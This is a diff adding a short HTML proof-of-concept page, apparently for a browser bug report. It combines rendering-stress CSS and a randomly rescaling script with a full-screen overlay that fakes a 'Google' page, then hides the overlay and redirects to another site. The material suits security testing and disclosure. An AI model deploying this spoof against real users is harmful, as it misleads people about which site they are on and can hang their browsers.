@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>PoC</title>
+    <style>
+      :root {
+        --s: 1;
+      }
+      html {
+        transform: scale(var(--s));
+      }
+      * {
+        border-right: 99ex dotted peru;
+        border-radius: 999999999em;
+      }
+      dl {
+        font: 999999999999999999999999vmax/9999 Ahem;
+      }
+      body {
+        margin: 0;
+        min-height: 300vh;
+      }
+
+      .spoof {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: white;
+        z-index: 999999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        pointer-events: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="spoof" id="spoof">
+      <h1 style="color: #4285f4">Google</h1>
+    </div>
+
+    <dl>X</dl>
+    <dl>X</dl>
+    <dl>X</dl>
+    <dl>X</dl>
+    <dl>X</dl>
+
+    <script>
+      let root = document.documentElement;
+
+      setInterval(() => {
+        root.style.setProperty("--s", Math.random() * 10);
+      }, 500);
+
+      setTimeout(() => {
+        document.getElementById("spoof").style.display = "none";
+        location.href = "https://permission.site";
+      }, 3000);
+    </script>
+  </body>
+</html>
